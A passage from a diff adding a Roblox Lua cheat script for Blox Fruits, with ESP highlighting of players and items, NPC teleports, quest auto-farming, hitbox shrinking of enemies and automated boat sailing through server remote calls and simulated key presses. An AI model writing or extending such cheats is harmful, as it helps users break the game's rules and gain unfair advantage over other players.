+                    TweenPlayer(CFrame.new(-5571, 1089, -2661));
+                elseif _G.SelectNPC == "Horned Man" then
+                    TweenPlayer(CFrame.new(-11890, 931, -8760));
+                elseif _G.SelectNPC == "Hungey Man" then
+                    TweenPlayer(CFrame.new(-10919, 624, -10268));
+                elseif _G.SelectNPC == "Previous Hero" then
+                    TweenPlayer(CFrame.new(-10368, 332, -10128));
+                elseif _G.SelectNPC == "Butler" then
+                    TweenPlayer(CFrame.new(-5125, 316, -3130));
+                elseif _G.SelectNPC == "Lunoven" then
+                    TweenPlayer(CFrame.new(-5117, 316, -3093));
+                elseif _G.SelectNPC == "Elite Hunter" then
+                    TweenPlayer(CFrame.new(-5420, 314, -2828));
+                elseif _G.SelectNPC == "Player Hunter" then
+                    TweenPlayer(CFrame.new(-5559, 314, -2840));
+                elseif _G.SelectNPC == "Uzoth" then
+                    TweenPlayer(CFrame.new(-9785, 852, 6667));
+                end
+            until not _G.TeleportNPC;
+        end
+        StopTween(_G.TeleportNPC);
+    end
+});
+EspSection = Tabs.EspTab:Section({
+    Title = "Esp",
+    TextXAlignment = "Left"
+});
+EspPlayerToggle = Tabs.EspTab:Toggle({
+    Title = "Esp Player",
+    Desc = "Highlight Player",
+    Value = _G.Settings.Esp["ESP Player"],
+    Callback = function(state)
+        _G.Settings.Esp["ESP Player"] = state;
+    end
+});
+EspChestToggle = Tabs.EspTab:Toggle({
+    Title = "Esp Chest",
+    Desc = "Highlight Chest",
+    Value = _G.Settings.Esp["ESP Chest"],
+    Callback = function(state)
+        _G.Settings.Esp["ESP Chest"] = state;
+    end
+});
+EspDevilFruitToggle = Tabs.EspTab:Toggle({
+    Title = "Esp DevilFruit",
+    Desc = "Highlight DevilFruit",
+    Value = _G.Settings.Esp["ESP DevilFruit"],
+    Callback = function(state)
+        _G.Settings.Esp["ESP DevilFruit"] = state;
+    end
+});
+EspRealFruitToggle = Tabs.EspTab:Toggle({
+    Title = "Esp RealFruit",
+    Desc = "Highlight RealFruit",
+    Value = _G.Settings.Esp["ESP RealFruit"],
+    Callback = function(state)
+        _G.Settings.Esp["ESP RealFruit"] = state;
+    end
+});
+EspFlowerToggle = Tabs.EspTab:Toggle({
+    Title = "Esp Flower",
+    Desc = "Highlight Flower",
+    Value = _G.Settings.Esp["ESP Flower"],
+    Callback = function(state)
+        _G.Settings.Esp["ESP Flower"] = state;
+    end
+});
+EspIslandToggle = Tabs.EspTab:Toggle({
+    Title = "Esp Island",
+    Desc = "Highlight Island",
+    Value = _G.Settings.Esp["ESP Island"],
+    Callback = function(state)
+        _G.Settings.Esp["ESP Island"] = state;
+    end
+});
+EspNpcToggle = Tabs.EspTab:Toggle({
+    Title = "Esp Npc",
+    Desc = "Highlight Npc",
+    Value = _G.Settings.Esp["ESP Npc"],
+    Callback = function(state)
+        _G.Settings.Esp["ESP Npc"] = state;
+    end
+});
+EspSeaBeastToggle = Tabs.EspTab:Toggle({
+    Title = "Esp Sea Beast",
+    Desc = "Highlight SeaBeast",
+    Value = _G.Settings.Esp["ESP Sea Beast"],
+    Callback = function(state)
+        _G.Settings.Esp["ESP Sea Beast"] = state;
+    end
+});
+EspMonsterToggle = Tabs.EspTab:Toggle({
+    Title = "Esp Monster",
+    Desc = "Highlight Monster",
+    Value = _G.Settings.Esp["ESP Monster"],
+    Callback = function(state)
+        _G.Settings.Esp["ESP Monster"] = state;
+    end
+});
+EspMirageIslandToggle = Tabs.EspTab:Toggle({
+    Title = "Esp Mirage Island",
+    Desc = "Highlight Mirage Island",
+    Value = _G.Settings.Esp["ESP Mirage"],
+    Callback = function(state)
+        _G.Settings.Esp["ESP Mirage"] = state;
+    end
+});
+EspKitsuneIslandToggle = Tabs.EspTab:Toggle({
+    Title = "Esp Kitsune Island",
+    Desc = "Highlight Kitsune Island",
+    Value = _G.Settings.Esp["ESP Kitsune"],
+    Callback = function(state)
+        _G.Settings.Esp["ESP Kitsune"] = state;
+    end
+});
+EspFrozenDimensionToggle = Tabs.EspTab:Toggle({
+    Title = "Esp Frozen Dimension",
+    Desc = "Highlight Frozen Dimension",
+    Value = _G.Settings.Esp["ESP Frozen"],
+    Callback = function(state)
+        _G.Settings.Esp["ESP Frozen"] = state;
+    end
+});
+EspPrehistoricIslandToggle = Tabs.EspTab:Toggle({
+    Title = "Esp Prehistoric Island",
+    Desc = "Highlight Prehistoric Island",
+    Value = _G.Settings.Esp["ESP Prehistoric"],
+    Callback = function(state)
+        _G.Settings.Esp["ESP Prehistoric"] = state;
+    end
+});
+EspGearToggle = Tabs.EspTab:Toggle({
+    Title = "Esp Gear",
+    Desc = "Highlight Gear",
+    Value = _G.Settings.Esp["ESP Gear"],
+    Callback = function(state)
+        _G.Settings.Esp["ESP Gear"] = state;
+    end
+});
+DragonDojoSection = Tabs.DragonDojoTab:Section({
+    Title = "Dragon Dojo",
+    TextXAlignment = "Left"
+});
+AutoFarmBlazeEmberToggle = Tabs.DragonDojoTab:Toggle({
+    Title = "Auto Farm Blaze Ember",
+    Desc = "Auto Compleate Quest + Collect Blaze Ember [ Sea 3 Only ]",
+    Value = _G.Settings.DragonDojo["Auto Farm Blaze Ember"],
+    Callback = function(state)
+        _G.Settings.DragonDojo["Auto Farm Blaze Ember"] = state;
+        StopTween(_G.Settings.DragonDojo["Auto Farm Blaze Ember"]);
+        (getgenv()).SaveSetting();
+    end
+});
+function getBlazeEmberQuest()
+    local ResQuest =
+        ((((game:GetService("ReplicatedStorage")):WaitForChild("Modules")):WaitForChild("Net")):WaitForChild(
+            "RF/DragonHunter")):InvokeServer({
+            Context = "Check"
+        });
+    if ResQuest then
+        for key, value in pairs(ResQuest) do
+            if key == "Text" then
+                return value;
+            end
+        end
+    end
+end
+function getRequestQuest()
+    local Req = ((((game:GetService("ReplicatedStorage")):WaitForChild("Modules")):WaitForChild("Net")):WaitForChild(
+        "RF/DragonHunter")):InvokeServer({
+        Context = "RequestQuest"
+    });
+    return Req;
+end
+function getIsOnQuest()
+    local ResQuest =
+        ((((game:GetService("ReplicatedStorage")):WaitForChild("Modules")):WaitForChild("Net")):WaitForChild(
+            "RF/DragonHunter")):InvokeServer({
+            Context = "Check"
+        });
+    if ResQuest then
+        for key, value in pairs(ResQuest) do
+            if key == "Text" then
+                if string.find(value, "Venomous Assailant") or string.find(value, "Hydra Enforcer") or
+                    string.find(value, "Destroy 10 trees") then
+                    return true;
+                end
+            end
+        end
+    end
+    return false;
+end
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.DragonDojo["Auto Farm Blaze Ember"] then
+            pcall(function()
+                if not _G.OnBlzeQuest and (not getIsOnQuest()) then
+                    local DragonHunterPos = CFrame.new(5864.86377, 1209.55066, 812.775024, 0.879059196,
+                        0.00000000381980803, 0.476712614, -0.0000000131110456, 1, 0.0000000161639893, -0.476712614,
+                        -0.0000000204593036, 0.879059196);
+                    TweenPlayer(DragonHunterPos);
+                    ((((game:GetService("ReplicatedStorage")):WaitForChild("Modules")):WaitForChild("Net")):WaitForChild(
+                        "RF/DragonHunter")):InvokeServer({
+                        Context = "RequestQuest"
+                    });
+                end
+                SaveBlazeEmberQuest();
+                _G.OnBlzeQuest = true;
+            end);
+        end
+    end
+end);
+function SaveBlazeEmberQuest()
+    if string.find(getBlazeEmberQuest(), "Venomous Assailant") then
+        _G.BlazeEmberQuest = "Venomous Assailant";
+    elseif string.find(getBlazeEmberQuest(), "Hydra Enforcer") then
+        _G.BlazeEmberQuest = "Hydra Enforcer";
+    elseif string.find(getBlazeEmberQuest(), "Destroy 10 trees") then
+        _G.BlazeEmberQuest = "Destroy 10 trees";
+    end
+end
+_G.OnBlzeQuest = false;
+spawn(function()
+    while wait(0.2) do
+        if isQuestCompleated() then
+            _G.OnBlzeQuest = false;
+        end
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.DragonDojo["Auto Farm Blaze Ember"] then
+            pcall(function()
+                if _G.BlazeEmberQuest == "Venomous Assailant" and _G.OnBlzeQuest then
+                    autoKillVenemousAssailant();
+                elseif _G.BlazeEmberQuest == "Hydra Enforcer" and _G.OnBlzeQuest then
+                    autoKillHydraEnforcer();
+                elseif _G.BlazeEmberQuest == "Destroy 10 trees" and _G.OnBlzeQuest then
+                    autoDestroyHydraTrees();
+                end
+            end);
+        end
+    end
+end);
+function isQuestCompleated()
+    for i, v in pairs((game:GetService("Players")).LocalPlayer.PlayerGui.Notifications:GetChildren()) do
+        for _, Notif in pairs(v:GetChildren()) do
+            if string.find(Notif.Text, "Task completed!") or string.find(Notif.Text, "Head back to the Dojo") then
+                return true;
+            end
+        end
+    end
+    return false;
+end
+function CollectBlazeEmber()
+    InstantTp((((game:GetService("Workspace")):WaitForChild("EmberTemplate")):FindFirstChild("Part")).CFrame);
+end
+function autoKillVenemousAssailant()
+    if not (game:GetService("Workspace")).Enemies:FindFirstChild("Venomous Assailant") then
+        TweenPlayer(CFrame.new(4789.29639, 1078.59082, 962.764099, -0.381989956, 0.0000000198627319, 0.924166501,
+            0.0000000126859874, 1, -0.0000000162490341, -0.924166501, 0.00000000551699708, -0.381989956));
+    else
+        for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+            if v.Name == "Venomous Assailant" then
+                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+                    repeat
+                        (game:GetService("RunService")).Heartbeat:wait();
+                        AutoHaki();
+                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                        v.Humanoid.WalkSpeed = 0;
+                        v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                        PosMon = v.HumanoidRootPart.CFrame;
+                        MonFarm = v.Name;
+                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                        Attack();
+                    until not v.Parent or v.Humanoid.Health <= 0 or
+                        (not _G.Settings.DragonDojo["Auto Farm Blaze Ember"]) or (not _G.OnBlzeQuest);
+                end
+            end
+        end
+    end
+end
+function autoKillHydraEnforcer()
+    if not (game:GetService("Workspace")).Enemies:FindFirstChild("Hydra Enforcer") then
+        TweenPlayer(CFrame.new(4789.29639, 1078.59082, 962.764099, -0.381989956, 0.0000000198627319, 0.924166501,
+            0.0000000126859874, 1, -0.0000000162490341, -0.924166501, 0.00000000551699708, -0.381989956));
+    else
+        for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+            if v.Name == "Hydra Enforcer" then
+                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+                    repeat
+                        (game:GetService("RunService")).Heartbeat:wait();
+                        AutoHaki();
+                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                        v.Humanoid.WalkSpeed = 0;
+                        v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                        PosMon = v.HumanoidRootPart.CFrame;
+                        MonFarm = v.Name;
+                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                        Attack();
+                    until not v.Parent or v.Humanoid.Health <= 0 or
+                        (not _G.Settings.DragonDojo["Auto Farm Blaze Ember"]) or (not _G.OnBlzeQuest);
+                end
+            end
+        end
+    end
+end
+function autoDestroyHydraTrees()
+    local Pos1 = CFrame.new(5260.28223, 1004.24329, 347.062622, 0.923247099, -0.00000000370291953, 0.384206682,
+        -0.000000000671108058, 1, 0.0000000112505019, -0.384206682, -0.0000000106448379, 0.923247099);
+    local Pos2 = CFrame.new(5237.94775, 1004.24329, 429.596344, 0.371416599, 0.00000000207420636, 0.92846632,
+        0.00000000476562345, 1, -0.00000000414041734, -0.92846632, 0.00000000596254068, 0.371416599);
+    local Pos3 = CFrame.new(5320.87793, 1004.24329, 439.152954, 0.136340275, -0.0000000995428806, -0.990662038,
+        0.0000000610136723, 1, -0.0000000920841288, 0.990662038, -0.0000000478891593, 0.136340275);
+    local Pos4 = CFrame.new(5346.70752, 1004.24329, 359.389008, 0.296962529, 0.0000000642768185, -0.954889119,
+        -0.0000000737323518, 1, 0.0000000443832349, 0.954889119, 0.0000000572260639, 0.296962529);
+    local myPos = (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame;
+    if (myPos.Position - Pos1.Position).Magnitude <= 3 then
+        useAllSkill();
+    else
+        TweenPlayer(Pos1);
+    end
+    if (myPos.Position - Pos2.Position).Magnitude <= 3 then
+        useAllSkill();
+    else
+        TweenPlayer(Pos2);
+    end
+    if (myPos.Position - Pos3.Position).Magnitude <= 3 then
+        useAllSkill();
+    else
+        TweenPlayer(Pos3);
+    end
+    if (myPos.Position - Pos4.Position).Magnitude <= 3 then
+        useAllSkill();
+    else
+        TweenPlayer(Pos4);
+    end
+end
+DoneSkillGun = false;
+DoneSkillSword = false;
+DoneSkillFruit = false;
+DoneSkillMelee = false;
+function useAllSkill()
+    if DoneSkillFruit == false then
+        for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+            if v:IsA("Tool") then
+                if v.ToolTip == "Blox Fruit" then
+                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
+                end
+            end
+        end
+        (game:service("VirtualInputManager")):SendKeyEvent(true, "Z", false, game);
+        wait(0);
+        (game:service("VirtualInputManager")):SendKeyEvent(false, "Z", false, game);
+        (game:service("VirtualInputManager")):SendKeyEvent(true, "X", false, game);
+        wait(0);
+        (game:service("VirtualInputManager")):SendKeyEvent(false, "X", false, game);
+        (game:service("VirtualInputManager")):SendKeyEvent(true, "C", false, game);
+        wait(0);
+        (game:service("VirtualInputManager")):SendKeyEvent(false, "C", false, game);
+        (game:service("VirtualInputManager")):SendKeyEvent(true, "V", false, game);
+        wait(0);
+        (game:service("VirtualInputManager")):SendKeyEvent(false, "V", false, game);
+        (game:service("VirtualInputManager")):SendKeyEvent(true, "F", false, game);
+        wait(0);
+        (game:service("VirtualInputManager")):SendKeyEvent(false, "F", false, game);
+        DoneSkillFruit = true;
+    end
+    if DoneSkillMelee == false then
+        for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+            if v:IsA("Tool") then
+                if v.ToolTip == "Melee" then
+                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
+                end
+            end
+        end
+        (game:service("VirtualInputManager")):SendKeyEvent(true, "Z", false, game);
+        wait(0);
+        (game:service("VirtualInputManager")):SendKeyEvent(false, "Z", false, game);
+        (game:service("VirtualInputManager")):SendKeyEvent(true, "X", false, game);
+        wait(0);
+        (game:service("VirtualInputManager")):SendKeyEvent(false, "X", false, game);
+        (game:service("VirtualInputManager")):SendKeyEvent(true, "C", false, game);
+        wait(0);
+        (game:service("VirtualInputManager")):SendKeyEvent(false, "C", false, game);
+        (game:service("VirtualInputManager")):SendKeyEvent(true, "V", false, game);
+        wait(0);
+        (game:service("VirtualInputManager")):SendKeyEvent(false, "V", false, game);
+        DoneSkillMelee = true;
+    end
+    if DoneSkillSword == false then
+        for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+            if v:IsA("Tool") then
+                if v.ToolTip == "Sword" then
+                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
+                end
+            end
+        end
+        (game:service("VirtualInputManager")):SendKeyEvent(true, "Z", false, game);
+        wait(0);
+        (game:service("VirtualInputManager")):SendKeyEvent(false, "Z", false, game);
+        (game:service("VirtualInputManager")):SendKeyEvent(true, "X", false, game);
+        wait(0);
+        (game:service("VirtualInputManager")):SendKeyEvent(false, "X", false, game);
+        DoneSkillSword = true;
+    end
+    if DoneSkillGun == false then
+        for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+            if v:IsA("Tool") then
+                if v.ToolTip == "Gun" then
+                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
+                end
+            end
+        end
+        (game:service("VirtualInputManager")):SendKeyEvent(true, "Z", false, game);
+        wait(0.1);
+        (game:service("VirtualInputManager")):SendKeyEvent(false, "Z", false, game);
+        (game:service("VirtualInputManager")):SendKeyEvent(true, "X", false, game);
+        wait(0.1);
+        (game:service("VirtualInputManager")):SendKeyEvent(false, "X", false, game);
+        DoneSkillGun = true;
+    end
+    DoneSkillGun = false;
+    DoneSkillSword = false;
+    DoneSkillFruit = false;
+    DoneSkillMelee = false;
+end
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.DragonDojo["Auto Farm Blaze Ember"] then
+            pcall(function()
+                if ((game:GetService("Workspace")):WaitForChild("EmberTemplate")):FindFirstChild("Part") then
+                    CollectBlazeEmber();
+                end
+            end);
+        end
+    end
+end);
+CraftVolcanicMagnetButton = Tabs.DragonDojoTab:Button({
+    Title = "Craft Volcanic Magnet",
+    Callback = function()
+        (((game:GetService("ReplicatedStorage")):WaitForChild("Remotes")):WaitForChild("CommF_")):InvokeServer(
+            "CraftItem", "Craft", "Volcanic Magnet");
+    end
+});
+local SeaEventSection = Tabs.SeaEventTab:Section({
+    Title = "Sea Event",
+    TextXAlignment = "Left"
+});
+local BoatList = {"Guardian", "Beast Hunter", "PirateGrandBrigade", "MarineGrandBrigade", "PirateBrigade",
+                  "MarineBrigade", "PirateSloop", "MarineSloop"};
+local ZoneList = {"Zone 1", "Zone 2", "Zone 3", "Zone 4", "Zone 5", "Zone 6", "Infinite"};
+ChooseBoatDropdown = Tabs.SeaEventTab:Dropdown({
+    Title = "Choose Boat",
+    Values = BoatList,
+    Value = _G.Settings.SeaEvent["Selected Boat"],
+    Callback = function(option)
+        _G.Settings.SeaEvent["Selected Boat"] = option;
+        (getgenv()).SaveSetting();
+    end
+});
+ChooseZoneDropdown = Tabs.SeaEventTab:Dropdown({
+    Title = "Choose Zone",
+    Values = ZoneList,
+    Value = _G.Settings.SeaEvent["Selected Zone"],
+    Callback = function(option)
+        _G.Settings.SeaEvent["Selected Zone"] = option;
+        (getgenv()).SaveSetting();
+    end
+});
+BoatTweenSpeedSlider = Tabs.SeaEventTab:Slider({
+    Title = "Boat Tween Speed",
+    Step = 1,
+    Value = {
+        Min = 1,
+        Max = 350,
+        Default = _G.Settings.SeaEvent["Boat Tween Speed"]
+    },
+    Callback = function(value)
+        _G.Settings.SeaEvent["Boat Tween Speed"] = value;
+    end
+});
+AutoSailBoatToggle = Tabs.SeaEventTab:Toggle({
+    Title = "Sail Boat",
+    Desc = "Auto Sail Boat & Kill Enemies",
+    Value = _G.Settings.SeaEvent["Sail Boat"],
+    Callback = function(state)
+        _G.Settings.SeaEvent["Sail Boat"] = state;
+        StopTween(_G.Settings.SeaEvent["Sail Boat"]);
+        (getgenv()).SaveSetting();
+        if not _G.Settings.SeaEvent["Sail Boat"] then
+            _G.SeaSkill = false;
+            Skillaimbot = false;
+        end
+    end
+});
+local CFrameSelectedZone;
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.SeaEvent["Selected Zone"] == "Zone 1" then
+                CFrameSelectedZone = CFrame.new(-21998.375, 30.0006084, -682.309143, 0.120013528, 0.00690158736,
+                    0.99274826, -0.0574118942, 0.998350561, -0.000000000236509201, -0.991110802, -0.0569955558,
+                    0.120211802);
+            elseif _G.Settings.SeaEvent["Selected Zone"] == "Zone 2" then
+                CFrameSelectedZone = CFrame.new(-26779.5215, 30.0005474, -822.858032, 0.307457417, 0.019647358,
+                    0.951358974, -0.0637726262, 0.997964442, -0.000000000415334017, -0.949422479, -0.0606706589,
+                    0.308084518);
+            elseif _G.Settings.SeaEvent["Selected Zone"] == "Zone 3" then
+                CFrameSelectedZone = CFrame.new(-31171.957, 30.0001011, -2256.93774, 0.37637493, 0.0150483791,
+                    0.926345229, -0.0399504974, 0.999201655, 0.0000000000270896673, -0.925605655, -0.0370079502,
+                    0.376675636);
+            elseif _G.Settings.SeaEvent["Selected Zone"] == "Zone 4" then
+                CFrameSelectedZone = CFrame.new(-34054.6875, 30.2187767, -2560.12012, 0.0935864747, -0.00122954219,
+                    0.995610416, 0.0624034069, 0.998040259, -0.00463332096, -0.993653536, 0.062563099, 0.0934797972);
+            elseif _G.Settings.SeaEvent["Selected Zone"] == "Zone 5" then
+                CFrameSelectedZone = CFrame.new(-38887.5547, 30.0004578, -2162.99023, -0.188895494, -0.00704088295,
+                    0.981971979, -0.0372481011, 0.999306023, -0.00000000139882339, -0.981290519, -0.0365765914,
+                    -0.189026669);
+            elseif _G.Settings.SeaEvent["Selected Zone"] == "Zone 6" then
+                CFrameSelectedZone = CFrame.new(-44541.7617, 30.0003204, -1244.8584, -0.0844199061, -0.00553312758,
+                    0.9964149, -0.0654025897, 0.997858942, 0.000000000202319411, -0.99428153, -0.0651681125,
+                    -0.0846010372);
+            elseif _G.Settings.SeaEvent["Selected Zone"] == "Infinite" then
+                CFrameSelectedZone = CFrame.new(-148073.359, 8.99999523, 7721.05078, -0.0825930536, -0.00000154416148,
+                    0.996583343, -0.000018696026, 1, -0.000000000000391858095, -0.996583343, -0.0000186321486,
+                    -0.0825930536);
+            end
+        end
+    end);
+end);
+function CheckBoat()
+    for i, v in pairs((game:GetService("Workspace")).Boats:GetChildren()) do
+        if v.Name == _G.Settings.SeaEvent["Selected Boat"] then
+            for _, child in pairs(v:GetChildren()) do
+                if child.Name == "MyBoatEsp" then
+                    return v;
+                end
+            end
+        end
+    end
+    return false;
+end
+function CheckEnemiesBoat()
+    if (game:GetService("Workspace")).Enemies:FindFirstChild("FishBoat") or
+        (game:GetService("Workspace")).Enemies:FindFirstChild("PirateBrigade") or
+        (game:GetService("Workspace")).Enemies:FindFirstChild("PirateGrandBrigade") then
+        return true;
+    end
+    return false;
+end
+function CheckShark()
+    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+        if v.Name == "Shark" and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+            v.Humanoid.Health > 0 then
+            if (game:GetService("Workspace")).Enemies:FindFirstChild("Shark") then
+                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
+                    200 then
+                    return true;
+                end
+            end
+        end
+    end
+    return false;
+end
+function CheckPiranha()
+    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+        if v.Name == "Piranha" and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+            v.Humanoid.Health > 0 then
+            if (game:GetService("Workspace")).Enemies:FindFirstChild("Piranha") then
+                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
+                    200 then
+                    return true;
+                end
+            end
+        end
+    end
+    return false;
+end
+function AddEsp(Name, Parent)
+    local BillboardGui = Instance.new("BillboardGui");
+    local TextLabel = Instance.new("TextLabel");
+    BillboardGui.Parent = Parent;
+    BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+    BillboardGui.Active = true;
+    BillboardGui.Name = Name;
+    BillboardGui.AlwaysOnTop = true;
+    BillboardGui.LightInfluence = 1;
+    BillboardGui.Size = UDim2.new(0, 200, 0, 50);
+    BillboardGui.StudsOffset = Vector3.new(0, 2.5, 0);
+    TextLabel.Parent = BillboardGui;
+    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+    TextLabel.BackgroundTransparency = 1;
+    TextLabel.Size = UDim2.new(1, 0, 1, 0);
+    TextLabel.Font = Enum.Font.GothamBold;
+    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255);
+    TextLabel.TextSize = 15;
+    TextLabel.Text = "";
+end
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            if _G.Settings.SeaEvent["Sail Boat"] then
+                if not CheckBoat() then
+                    local BuyBoatCFrame = CFrame.new(-16927.451171875, 9.0863618850708, 433.8642883300781);
+                    if (BuyBoatCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >
+                        2000 then
+                        BTP(BuyBoatCFrame);
+                    else
+                        BuyBoat = TweenPlayer(BuyBoatCFrame);
+                    end
+                    if ((CFrame.new((-16927.451171875), 9.0863618850708, 433.8642883300781)).Position -
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 10 then
+                        if BuyBoat then
+                            BuyBoat:Stop();
+                        end
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyBoat", _G.Settings
+                            .SeaEvent["Selected Boat"]);
+                        for i, v in pairs((game:GetService("Workspace")).Boats:GetChildren()) do
+                            if v.Name == _G.Settings.SeaEvent["Selected Boat"] then
+                                if (v.VehicleSeat.CFrame.Position -
+                                    (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
+                                    100 then
+                                    AddEsp("MyBoatEsp", v);
+                                end
+                            end
+                        end
+                        wait(1);
+                    end
+                elseif CheckBoat() then
+                    for i, v in pairs((game:GetService("Workspace")).Boats:GetChildren()) do
+                        if v.Name == _G.Settings.SeaEvent["Selected Boat"] then
+                            if v:FindFirstChild("MyBoatEsp") then
+                                if (game.Players.LocalPlayer.Character:WaitForChild("Humanoid")).Sit == false then
+                                    if CheckShark() and _G.Settings.SeaEvent["Auto Farm Shark"] or
+                                        (game:GetService("Workspace")).Enemies:FindFirstChild("Terrorshark") and
+                                        _G.Settings.SeaEvent["Auto Farm Terrorshark"] or CheckPiranha() and
+                                        _G.Settings.SeaEvent["Auto Farm Piranha"] or
+                                        (game:GetService("Workspace")).Enemies:FindFirstChild("Fish Crew Member") and
+                                        _G.Settings.SeaEvent["Auto Farm Fish Crew Member"] or
+                                        (game:GetService("Workspace")).Enemies:FindFirstChild("FishBoat") and
+                                        _G.Settings.SeaEvent["Auto Farm Ghost Ship"] or
+                                        (game:GetService("Workspace")).Enemies:FindFirstChild("PirateBrigade") and
+                                        _G.Settings.SeaEvent["Auto Farm Pirate Brigade"] or
+                                        (game:GetService("Workspace")).Enemies:FindFirstChild("PirateGrandBrigade") and
+                                        _G.Settings.SeaEvent["Auto Farm Pirate Grand Brigade"] or CheckSeaBeast() and
+                                        _G.Settings.SeaEvent["Auto Farm Seabeasts"] then
+                                        if stoppos then
+                                            stoppos:Stop();
+                                        end
+                                    else
+                                        stoppos = TweenPlayer(v.VehicleSeat.CFrame * CFrame.new(0, 1, 0));
+                                    end
+                                else
+                                    repeat
+                                        wait();
+                                        StopTweenBoat = TweenBoat(CFrameSelectedZone);
+                                    until CheckShark() and _G.Settings.SeaEvent["Auto Farm Shark"] or
+                                        (game:GetService("Workspace")).Enemies:FindFirstChild("Terrorshark") and
+                                        _G.Settings.SeaEvent["Auto Farm Terrorshark"] or CheckPiranha() and
+                                        _G.Settings.SeaEvent["Auto Farm Piranha"] or
+                                        (game:GetService("Workspace")).Enemies:FindFirstChild("Fish Crew Member") and
+                                        _G.Settings.SeaEvent["Auto Farm Fish Crew Member"] or
+                                        (game:GetService("Workspace")).Enemies:FindFirstChild("FishBoat") and
+                                        _G.Settings.SeaEvent["Auto Farm Ghost Ship"] or
+                                        (game:GetService("Workspace")).Enemies:FindFirstChild("PirateBrigade") and
+                                        _G.Settings.SeaEvent["Auto Farm Pirate Brigade"] or
+                                        (game:GetService("Workspace")).Enemies:FindFirstChild("PirateGrandBrigade") and
+                                        _G.Settings.SeaEvent["Auto Farm Pirate Grand Brigade"] or CheckSeaBeast() and
+                                        _G.Settings.SeaEvent["Auto Farm Seabeasts"] or
+                                        (game.Players.LocalPlayer.Character:WaitForChild("Humanoid")).Sit == false or
+                                        _G.Settings.SeaEvent["Sail Boat"] == false;
+                                    if StopTweenBoat then
+                                        StopTweenBoat:Stop();
+                                    end
+                                    (game:GetService("VirtualInputManager")):SendKeyEvent(true, 32, false, game);
+                                    wait(0.1);
+                                    (game:GetService("VirtualInputManager")):SendKeyEvent(false, 32, false, game);
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end);
+    end
+end);
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.SeaEvent["Sail Boat"] then
+                if CheckShark() and _G.Settings.SeaEvent["Auto Farm Shark"] or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Terrorshark") and
+                    _G.Settings.SeaEvent["Auto Farm Terrorshark"] or CheckPiranha() and
+                    _G.Settings.SeaEvent["Auto Farm Piranha"] or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Fish Crew Member") and
+                    _G.Settings.SeaEvent["Auto Farm Fish Crew Member"] or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("FishBoat") and
+                    _G.Settings.SeaEvent["Auto Farm Ghost Ship"] or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("PirateBrigade") and
+                    _G.Settings.SeaEvent["Auto Farm Pirate Brigade"] or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("PirateGrandBrigade") and
+                    _G.Settings.SeaEvent["Auto Farm Pirate Grand Brigade"] or CheckSeaBeast() and
+                    _G.Settings.SeaEvent["Auto Farm Seabeasts"] then
+                    if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
+                        (game:GetService("VirtualInputManager")):SendKeyEvent(true, 32, false, game);
+                        wait(0.1);
+                        (game:GetService("VirtualInputManager")):SendKeyEvent(false, 32, false, game);
+                    end
+                end
+            end
+        end
+    end);
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.SeaEvent["Sail Boat"] then
+            pcall(function()
+                if _G.Settings.SeaEvent["Sail Boat"] and
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Fish Crew Member") and
+                    _G.Settings.SeaEvent["Auto Farm Fish Crew Member"] then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if (game:GetService("Workspace")).Enemies:FindFirstChild("Fish Crew Member") then
+                            if v.Name == "Fish Crew Member" then
+                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                    v.Humanoid.Health > 0 then
+                                    repeat
